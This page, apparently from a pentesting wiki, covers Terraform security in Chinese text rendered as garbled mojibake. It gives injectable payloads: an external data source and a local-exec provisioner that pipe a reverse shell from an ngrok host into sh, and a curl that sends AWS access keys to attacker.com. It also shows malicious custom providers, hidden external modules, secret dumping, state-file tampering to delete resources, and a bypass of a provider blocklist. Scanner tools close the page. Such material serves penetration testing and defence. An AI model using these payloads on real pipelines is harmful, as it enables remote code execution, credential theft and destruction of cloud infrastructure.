# Terraform å®‰å…¨

{{#include ../banners/hacktricks-training.md}}

## åŸºæœ¬ä¿¡æ¯

[æ¥è‡ªæ–‡æ¡£ï¼š](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform æ˜¯ä¸€ä¸ª **åŸºç¡€è®¾æ–½å³ä»£ç å·¥å…·**ï¼Œå…è®¸æ‚¨åœ¨å¯è¯»çš„é…ç½®æ–‡ä»¶ä¸­å®šä¹‰ **äº‘å’Œæœ¬åœ°èµ„æº**ï¼Œè¿™äº›æ–‡ä»¶å¯ä»¥ç‰ˆæœ¬æ§åˆ¶ã€é‡ç”¨å’Œå…±äº«ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸€è‡´çš„å·¥ä½œæµç¨‹æ¥é…ç½®å’Œç®¡ç†æ•´ä¸ªç”Ÿå‘½å‘¨æœŸä¸­çš„æ‰€æœ‰åŸºç¡€è®¾æ–½ã€‚Terraform å¯ä»¥ç®¡ç†ä½çº§ç»„ä»¶ï¼Œå¦‚è®¡ç®—ã€å­˜å‚¨å’Œç½‘ç»œèµ„æºï¼Œä»¥åŠé«˜çº§ç»„ä»¶ï¼Œå¦‚ DNS æ¡ç›®å’Œ SaaS åŠŸèƒ½ã€‚

#### Terraform å¦‚ä½•å·¥ä½œï¼Ÿ

Terraform é€šè¿‡å…¶åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ (APIs) åˆ›å»ºå’Œç®¡ç†äº‘å¹³å°å’Œå…¶ä»–æœåŠ¡ä¸Šçš„èµ„æºã€‚æä¾›ç¨‹åºä½¿ Terraform èƒ½å¤Ÿä¸å‡ ä¹ä»»ä½•å…·æœ‰å¯è®¿é—® API çš„å¹³å°æˆ–æœåŠ¡ååŒå·¥ä½œã€‚

![](<../images/image (177).png>)

HashiCorp å’Œ Terraform ç¤¾åŒºå·²ç»ç¼–å†™äº† **è¶…è¿‡ 1700 ä¸ªæä¾›ç¨‹åº** æ¥ç®¡ç†æˆåƒä¸Šä¸‡ç§ä¸åŒç±»å‹çš„èµ„æºå’ŒæœåŠ¡ï¼Œè¿™ä¸ªæ•°å­—è¿˜åœ¨ä¸æ–­å¢é•¿ã€‚æ‚¨å¯ä»¥åœ¨ [Terraform æ³¨å†Œè¡¨](https://registry.terraform.io/) ä¸Šæ‰¾åˆ°æ‰€æœ‰å…¬å¼€å¯ç”¨çš„æä¾›ç¨‹åºï¼ŒåŒ…æ‹¬ Amazon Web Services (AWS)ã€Azureã€Google Cloud Platform (GCP)ã€Kubernetesã€Helmã€GitHubã€Splunkã€DataDog ç­‰ç­‰ã€‚

æ ¸å¿ƒ Terraform å·¥ä½œæµç¨‹ç”±ä¸‰ä¸ªé˜¶æ®µç»„æˆï¼š

- **å†™å…¥ï¼š** æ‚¨å®šä¹‰èµ„æºï¼Œè¿™äº›èµ„æºå¯èƒ½è·¨å¤šä¸ªäº‘æä¾›å•†å’ŒæœåŠ¡ã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯èƒ½ä¼šåˆ›å»ºä¸€ä¸ªé…ç½®ï¼Œä»¥åœ¨å…·æœ‰å®‰å…¨ç»„å’Œè´Ÿè½½å‡è¡¡å™¨çš„è™šæ‹Ÿç§æœ‰äº‘ (VPC) ç½‘ç»œä¸­çš„è™šæ‹Ÿæœºä¸Šéƒ¨ç½²åº”ç”¨ç¨‹åºã€‚
- **è®¡åˆ’ï¼š** Terraform åˆ›å»ºä¸€ä¸ªæ‰§è¡Œè®¡åˆ’ï¼Œæè¿°å®ƒå°†æ ¹æ®ç°æœ‰åŸºç¡€è®¾æ–½å’Œæ‚¨çš„é…ç½®åˆ›å»ºã€æ›´æ–°æˆ–é”€æ¯çš„åŸºç¡€è®¾æ–½ã€‚
- **åº”ç”¨ï¼š** ç»æ‰¹å‡†åï¼ŒTerraform æŒ‰ç…§æ­£ç¡®çš„é¡ºåºæ‰§è¡Œæè®®çš„æ“ä½œï¼Œå°Šé‡ä»»ä½•èµ„æºä¾èµ–å…³ç³»ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æ›´æ–° VPC çš„å±æ€§å¹¶æ›´æ”¹è¯¥ VPC ä¸­è™šæ‹Ÿæœºçš„æ•°é‡ï¼ŒTerraform å°†åœ¨æ‰©å±•è™šæ‹Ÿæœºä¹‹å‰é‡æ–°åˆ›å»º VPCã€‚

![](<../images/image (215).png>)

### Terraform å®éªŒå®¤

åªéœ€åœ¨æ‚¨çš„è®¡ç®—æœºä¸Šå®‰è£… terraformã€‚

è¿™é‡Œæœ‰ä¸€ä¸ª [æŒ‡å—](https://learn.hashicorp.com/tutorials/terraform/install-cli)ï¼Œè¿™é‡Œæœ‰ [ä¸‹è½½ terraform çš„æœ€ä½³æ–¹å¼](https://www.terraform.io/downloads)ã€‚

## Terraform ä¸­çš„ RCE

Terraform **æ²¡æœ‰æš´éœ²ç½‘é¡µæˆ–ç½‘ç»œæœåŠ¡çš„å¹³å°**ï¼Œå› æ­¤ï¼Œå¦¥å terraform çš„å”¯ä¸€æ–¹æ³•æ˜¯ **èƒ½å¤Ÿæ·»åŠ /ä¿®æ”¹ terraform é…ç½®æ–‡ä»¶**ã€‚

ç„¶è€Œï¼Œterraform æ˜¯ä¸€ä¸ª **éå¸¸æ•æ„Ÿçš„ç»„ä»¶**ï¼Œå› ä¸ºå®ƒå°†æ‹¥æœ‰ **ç‰¹æƒè®¿é—®** ä¸åŒä½ç½®ï¼Œä»¥ä¾¿æ­£å¸¸å·¥ä½œã€‚

æ”»å‡»è€…èƒ½å¤Ÿå¦¥åè¿è¡Œ terraform çš„ç³»ç»Ÿçš„ä¸»è¦æ–¹å¼æ˜¯ **å¦¥åå­˜å‚¨ terraform é…ç½®çš„ä»“åº“**ï¼Œå› ä¸ºåœ¨æŸäº›æ—¶å€™å®ƒä»¬å°†è¢« **è§£é‡Š**ã€‚

å®é™…ä¸Šï¼Œå¸‚é¢ä¸Šæœ‰ä¸€äº›è§£å†³æ–¹æ¡ˆ **åœ¨åˆ›å»º PR åè‡ªåŠ¨æ‰§è¡Œ terraform plan/apply**ï¼Œä¾‹å¦‚ **Atlantis**ï¼š

{{#ref}}
atlantis-security.md
{{#endref}}

å¦‚æœæ‚¨èƒ½å¤Ÿå¦¥åä¸€ä¸ª terraform æ–‡ä»¶ï¼Œæœ‰ä¸åŒçš„æ–¹æ³•å¯ä»¥åœ¨æŸäººæ‰§è¡Œ `terraform plan` æˆ– `terraform apply` æ—¶æ‰§è¡Œ RCEã€‚

### Terraform plan

Terraform plan æ˜¯ terraform ä¸­ **ä½¿ç”¨æœ€é¢‘ç¹çš„å‘½ä»¤**ï¼Œå¼€å‘äººå‘˜/ä½¿ç”¨ terraform çš„è§£å†³æ–¹æ¡ˆä¸€ç›´åœ¨è°ƒç”¨å®ƒï¼Œå› æ­¤ **è·å¾— RCE çš„æœ€ç®€å•æ–¹æ³•** æ˜¯ç¡®ä¿æ‚¨æ¯’åŒ–ä¸€ä¸ª terraform é…ç½®æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å°†åœ¨ `terraform plan` ä¸­æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**ä½¿ç”¨å¤–éƒ¨æä¾›ç¨‹åº**

Terraform æä¾›äº† [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs)ï¼Œå®ƒæä¾›äº†ä¸€ç§åœ¨ Terraform å’Œå¤–éƒ¨ç¨‹åºä¹‹é—´è¿›è¡Œæ¥å£çš„æ–¹æ³•ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ `external` æ•°æ®æºåœ¨ `plan` æœŸé—´è¿è¡Œä»»æ„ä»£ç ã€‚

åœ¨ terraform é…ç½®æ–‡ä»¶ä¸­æ³¨å…¥å¦‚ä¸‹å†…å®¹å°†åœ¨æ‰§è¡Œ `terraform plan` æ—¶æ‰§è¡Œåå‘ shellï¼š
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**ä½¿ç”¨è‡ªå®šä¹‰æä¾›ç¨‹åº**

æ”»å‡»è€…å¯ä»¥å°†ä¸€ä¸ª [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup) å‘é€åˆ° [Terraform Registry](https://registry.terraform.io/)ï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°åŠŸèƒ½åˆ†æ”¯ä¸­çš„ Terraform ä»£ç ä¸­ ([example from here](https://alex.kaskaso.li/post/terraform-plan-rce))ï¼š
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
æä¾›ç¨‹åºåœ¨ `init` ä¸­ä¸‹è½½ï¼Œå¹¶å°†åœ¨æ‰§è¡Œ `plan` æ—¶è¿è¡Œæ¶æ„ä»£ç 

æ‚¨å¯ä»¥åœ¨ [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) æ‰¾åˆ°ä¸€ä¸ªç¤ºä¾‹

**ä½¿ç”¨å¤–éƒ¨å¼•ç”¨**

ä¸Šè¿°ä¸¤ç§é€‰é¡¹éƒ½å¾ˆæœ‰ç”¨ï¼Œä½†ä¸å¤Ÿéšè”½ï¼ˆç¬¬äºŒç§æ¯”ç¬¬ä¸€ç§æ›´éšè”½ï¼Œä½†æ›´å¤æ‚ï¼‰ã€‚æ‚¨å¯ä»¥é€šè¿‡éµå¾ªä»¥ä¸‹å»ºè®®ä»¥**æ›´éšè”½çš„æ–¹å¼**æ‰§è¡Œæ­¤æ”»å‡»ï¼š

- ä¸è¦ç›´æ¥å°†åå‘ shell æ·»åŠ åˆ° terraform æ–‡ä»¶ä¸­ï¼Œæ‚¨å¯ä»¥**åŠ è½½ä¸€ä¸ªåŒ…å«åå‘ shell çš„å¤–éƒ¨èµ„æº**ï¼š
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
æ‚¨å¯ä»¥åœ¨ [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules) æ‰¾åˆ° rev shell ä»£ç ã€‚

- åœ¨å¤–éƒ¨èµ„æºä¸­ï¼Œä½¿ç”¨ **ref** åŠŸèƒ½æ¥éšè— **repo ä¸­åˆ†æ”¯é‡Œçš„ terraform rev shell ä»£ç **ï¼Œç±»ä¼¼äºï¼š`git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

å°†æ‰§è¡Œ Terraform apply ä»¥åº”ç”¨æ‰€æœ‰æ›´æ”¹ï¼Œæ‚¨ä¹Ÿå¯ä»¥åˆ©ç”¨å®ƒé€šè¿‡æ³¨å…¥ **ä¸€ä¸ªæ¶æ„çš„ Terraform æ–‡ä»¶ä¸** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
æ‚¨åªéœ€ç¡®ä¿ä¸€äº›æœ‰æ•ˆè½½è·åƒä»¥ä¸‹å†…å®¹ç»“æŸäº `main.tf` æ–‡ä»¶ï¼š
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
éµå¾ª**å‰ä¸€ç§æŠ€æœ¯çš„å»ºè®®**ä»¥**æ›´éšè”½çš„æ–¹å¼ä½¿ç”¨å¤–éƒ¨å¼•ç”¨**æ‰§è¡Œæ­¤æ”»å‡»ã€‚

## Secrets Dumps

æ‚¨å¯ä»¥é€šè¿‡è¿è¡Œ `terraform apply` æ¥**è½¬å‚¨ terraform ä½¿ç”¨çš„ç§˜å¯†å€¼**ï¼Œæ–¹æ³•æ˜¯å‘ terraform æ–‡ä»¶ä¸­æ·»åŠ ç±»ä¼¼çš„å†…å®¹ï¼š
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## æ»¥ç”¨ Terraform çŠ¶æ€æ–‡ä»¶

å¦‚æœæ‚¨å¯¹ terraform çŠ¶æ€æ–‡ä»¶å…·æœ‰å†™å…¥æƒé™ä½†æ— æ³•æ›´æ”¹ terraform ä»£ç ï¼Œ[**è¿™é¡¹ç ”ç©¶**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) æä¾›äº†ä¸€äº›æœ‰è¶£çš„é€‰é¡¹æ¥åˆ©ç”¨è¯¥æ–‡ä»¶ï¼š

### åˆ é™¤èµ„æº <a href="#deleting-resources" id="deleting-resources"></a>

æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥é”€æ¯èµ„æºï¼š

1. **åœ¨çŠ¶æ€æ–‡ä»¶ä¸­æ’å…¥ä¸€ä¸ªéšæœºåç§°çš„èµ„æºï¼ŒæŒ‡å‘è¦é”€æ¯çš„çœŸå®èµ„æº**

å› ä¸º terraform ä¼šçœ‹åˆ°è¯¥èµ„æºä¸åº”è¯¥å­˜åœ¨ï¼Œæ‰€ä»¥å®ƒä¼šé”€æ¯å®ƒï¼ˆæ ¹æ®æŒ‡ç¤ºçš„çœŸå®èµ„æº IDï¼‰ã€‚æ¥è‡ªä¸Šä¸€é¡µçš„ç¤ºä¾‹ï¼š
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **ä»¥ä¸€ç§æ— æ³•æ›´æ–°çš„æ–¹å¼ä¿®æ”¹è¦åˆ é™¤çš„èµ„æºï¼ˆè¿™æ ·å®ƒå°†è¢«åˆ é™¤å¹¶é‡æ–°åˆ›å»ºï¼‰**

å¯¹äº EC2 å®ä¾‹ï¼Œä¿®æ”¹å®ä¾‹çš„ç±»å‹è¶³ä»¥ä½¿ terraform åˆ é™¤å¹¶é‡æ–°åˆ›å»ºå®ƒã€‚

### RCE

è¿˜å¯ä»¥ [åˆ›å»ºè‡ªå®šä¹‰æä¾›ç¨‹åº](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider)ï¼Œå¹¶ä»…æ›¿æ¢ terraform çŠ¶æ€æ–‡ä»¶ä¸­çš„ä¸€ä¸ªæä¾›ç¨‹åºä¸ºæ¶æ„æä¾›ç¨‹åºï¼Œæˆ–æ·»åŠ ä¸€ä¸ªå¸¦æœ‰æ¶æ„æä¾›ç¨‹åºçš„ç©ºèµ„æºã€‚åŸå§‹ç ”ç©¶çš„ç¤ºä¾‹ï¼š
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
### æ›¿æ¢é»‘åå•æä¾›è€…

å¦‚æœæ‚¨é‡åˆ° `hashicorp/external` è¢«åˆ—å…¥é»‘åå•çš„æƒ…å†µï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼é‡æ–°å®ç° `external` æä¾›è€…ã€‚æ³¨æ„ï¼šæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ç”± https://registry.terraform.io/providers/nazarewk/external/latest å‘å¸ƒçš„ external æä¾›è€…çš„åˆ†æ”¯ã€‚æ‚¨ä¹Ÿå¯ä»¥å‘å¸ƒè‡ªå·±çš„åˆ†æ”¯æˆ–é‡æ–°å®ç°ã€‚
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
ç„¶åæ‚¨å¯ä»¥åƒå¾€å¸¸ä¸€æ ·ä½¿ç”¨ `external`ã€‚
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## è‡ªåŠ¨å®¡è®¡å·¥å…·

### [**Snyk åŸºç¡€è®¾æ–½å³ä»£ç  (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk æä¾›å…¨é¢çš„åŸºç¡€è®¾æ–½å³ä»£ç  (IaC) æ‰«æè§£å†³æ–¹æ¡ˆï¼Œèƒ½å¤Ÿæ£€æµ‹ Terraformã€CloudFormationã€Kubernetes å’Œå…¶ä»– IaC æ ¼å¼ä¸­çš„æ¼æ´å’Œé”™è¯¯é…ç½®ã€‚

- **ç‰¹ç‚¹ï¼š**
- å®æ—¶æ‰«æå®‰å…¨æ¼æ´å’Œåˆè§„æ€§é—®é¢˜ã€‚
- ä¸ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼ˆGitHubã€GitLabã€Bitbucketï¼‰é›†æˆã€‚
- è‡ªåŠ¨ä¿®å¤æ‹‰å–è¯·æ±‚ã€‚
- è¯¦ç»†çš„ä¿®å¤å»ºè®®ã€‚
- **æ³¨å†Œï¼š** åœ¨ [Snyk](https://snyk.io/) ä¸Šåˆ›å»ºä¸€ä¸ªè´¦æˆ·ã€‚
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** æ˜¯ä¸€ä¸ªç”¨äºåŸºç¡€è®¾æ–½å³ä»£ç  (IaC) çš„é™æ€ä»£ç åˆ†æå·¥å…·ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ªç”¨äºå›¾åƒå’Œå¼€æºåŒ…çš„è½¯ä»¶ç»„æˆåˆ†æ (SCA) å·¥å…·ã€‚

å®ƒæ‰«æä½¿ç”¨ [Terraform](https://terraform.io/) ã€[Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md) ã€[Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md) ã€[AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md) ã€[Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md) ã€[Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md) ã€[Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md) ã€[Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md) ã€[Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md) ã€[Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md) ã€[OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md) ã€[ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md) æˆ– [OpenTofu](https://opentofu.org/) æä¾›çš„äº‘åŸºç¡€è®¾æ–½ï¼Œå¹¶ä½¿ç”¨åŸºäºå›¾çš„æ‰«ææ£€æµ‹å®‰å…¨å’Œåˆè§„æ€§é”™è¯¯é…ç½®ã€‚

å®ƒæ‰§è¡Œ [è½¯ä»¶ç»„æˆåˆ†æ (SCA) æ‰«æ](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md)ï¼Œè¿™æ˜¯å¯¹å¼€æºåŒ…å’Œå›¾åƒè¿›è¡Œçš„æ‰«æï¼Œä»¥æŸ¥æ‰¾å¸¸è§æ¼æ´å’Œæš´éœ² (CVE)ã€‚
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

æ¥è‡ª [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ã€ä¸“æ³¨äºå®‰å…¨å’Œåˆè§„æ€§çš„æµ‹è¯•æ¡†æ¶ï¼Œé’ˆå¯¹ terraform è¿›è¡Œè´Ÿé¢æµ‹è¯•ï¼Œä»¥æ”¯æŒæ‚¨çš„åŸºç¡€è®¾æ–½å³ä»£ç ã€‚

- **åˆè§„æ€§:** ç¡®ä¿å®æ–½çš„ä»£ç éµå¾ªå®‰å…¨æ ‡å‡†å’Œæ‚¨è‡ªå·±çš„è‡ªå®šä¹‰æ ‡å‡†
- **è¡Œä¸ºé©±åŠ¨å¼€å‘:** æˆ‘ä»¬å‡ ä¹ä¸ºæ‰€æœ‰äº‹ç‰©éƒ½é‡‡ç”¨ BDDï¼Œä¸ºä»€ä¹ˆä¸ä¸º IaC å‘¢ï¼Ÿ
- **å¯ç§»æ¤:** åªéœ€ä» `pip` å®‰è£…æˆ–é€šè¿‡ `docker` è¿è¡Œã€‚è¯·å‚è§ [Installation](https://terraform-compliance.com/pages/installation/)
- **é¢„éƒ¨ç½²:** åœ¨ä»£ç éƒ¨ç½²ä¹‹å‰è¿›è¡ŒéªŒè¯
- **æ˜“äºé›†æˆ:** å®ƒå¯ä»¥åœ¨æ‚¨çš„ç®¡é“ä¸­è¿è¡Œï¼ˆæˆ–åœ¨ git hooks ä¸­ï¼‰ï¼Œä»¥ç¡®ä¿æ‰€æœ‰éƒ¨ç½²éƒ½ç»è¿‡éªŒè¯ã€‚
- **èŒè´£åˆ†ç¦»:** æ‚¨å¯ä»¥å°†æµ‹è¯•ä¿å­˜åœ¨ä¸åŒçš„ä»£ç åº“ä¸­ï¼Œç”±ä¸€ä¸ªç‹¬ç«‹çš„å›¢é˜Ÿè´Ÿè´£ã€‚

> [!NOTE]
> ä¸å¹¸çš„æ˜¯ï¼Œå¦‚æœä»£ç ä½¿ç”¨äº†ä¸€äº›æ‚¨æ²¡æœ‰è®¿é—®æƒé™çš„æä¾›è€…ï¼Œæ‚¨å°†æ— æ³•æ‰§è¡Œ `terraform plan` å¹¶è¿è¡Œæ­¤å·¥å…·ã€‚
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

æ¥è‡ª [**docs**](https://github.com/aquasecurity/tfsec)ï¼štfsec ä½¿ç”¨é™æ€åˆ†ææ‚¨çš„ terraform ä»£ç æ¥å‘ç°æ½œåœ¨çš„é”™è¯¯é…ç½®ã€‚

- â˜ï¸ æ£€æŸ¥æ‰€æœ‰ä¸»è¦ï¼ˆå’Œä¸€äº›æ¬¡è¦ï¼‰äº‘æä¾›å•†çš„é”™è¯¯é…ç½®
- â›” æ•°ç™¾æ¡å†…ç½®è§„åˆ™
- ğŸª† æ‰«ææ¨¡å—ï¼ˆæœ¬åœ°å’Œè¿œç¨‹ï¼‰
- â• è¯„ä¼° HCL è¡¨è¾¾å¼ä»¥åŠå­—é¢å€¼
- â†ªï¸ è¯„ä¼° Terraform å‡½æ•°ï¼Œä¾‹å¦‚ `concat()`
- ğŸ”— è¯„ä¼° Terraform èµ„æºä¹‹é—´çš„å…³ç³»
- ğŸ§° ä¸ Terraform CDK å…¼å®¹
- ğŸ™… åº”ç”¨ï¼ˆå¹¶ç¾åŒ–ï¼‰ç”¨æˆ·å®šä¹‰çš„ Rego ç­–ç•¥
- ğŸ“ƒ æ”¯æŒå¤šç§è¾“å‡ºæ ¼å¼ï¼šå¯çˆ±ï¼ˆé»˜è®¤ï¼‰ã€JSONã€SARIFã€CSVã€CheckStyleã€JUnitã€æ–‡æœ¬ã€Gifã€‚
- ğŸ› ï¸ å¯é…ç½®ï¼ˆé€šè¿‡ CLI æ ‡å¿—å’Œ/æˆ–é…ç½®æ–‡ä»¶ï¼‰
- âš¡ éå¸¸å¿«é€Ÿï¼Œèƒ½å¤Ÿå¿«é€Ÿæ‰«æå·¨å¤§çš„ä»£ç åº“
```bash
brew install tfsec
tfsec /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

ä½¿ç”¨ **KICS** ç”± Checkmarx æä¾›çš„å·¥å…·ï¼Œåœ¨åŸºç¡€è®¾æ–½å³ä»£ç çš„å¼€å‘å‘¨æœŸæ—©æœŸå‘ç°å®‰å…¨æ¼æ´ã€åˆè§„æ€§é—®é¢˜å’ŒåŸºç¡€è®¾æ–½é…ç½®é”™è¯¯ã€‚

**KICS** ä»£è¡¨ **K**eeping **I**nfrastructure as **C**ode **S**ecureï¼Œå®ƒæ˜¯å¼€æºçš„ï¼Œæ˜¯ä»»ä½•äº‘åŸç”Ÿé¡¹ç›®çš„å¿…å¤‡å·¥å…·ã€‚
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

æ¥è‡ª[**æ–‡æ¡£**](https://github.com/tenable/terrascan)ï¼šTerrascanæ˜¯ä¸€ä¸ªç”¨äºåŸºç¡€è®¾æ–½å³ä»£ç çš„é™æ€ä»£ç åˆ†æå™¨ã€‚Terrascanå…è®¸æ‚¨ï¼š

- æ— ç¼æ‰«æåŸºç¡€è®¾æ–½å³ä»£ç ä¸­çš„é”™è¯¯é…ç½®ã€‚
- ç›‘æ§å·²é…ç½®çš„äº‘åŸºç¡€è®¾æ–½çš„é…ç½®æ›´æ”¹ï¼Œè¿™äº›æ›´æ”¹ä¼šå¼•å…¥å§¿æ€æ¼‚ç§»ï¼Œå¹¶èƒ½å¤Ÿæ¢å¤åˆ°å®‰å…¨å§¿æ€ã€‚
- æ£€æµ‹å®‰å…¨æ¼æ´å’Œåˆè§„æ€§è¿è§„ã€‚
- åœ¨é…ç½®äº‘åŸç”ŸåŸºç¡€è®¾æ–½ä¹‹å‰å‡è½»é£é™©ã€‚
- æä¾›çµæ´»æ€§ä»¥åœ¨æœ¬åœ°è¿è¡Œæˆ–ä¸æ‚¨çš„CI\CDé›†æˆã€‚
```bash
brew install terrascan
```
## å‚è€ƒæ–‡çŒ®

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

{{#include ../banners/hacktricks-training.md}}
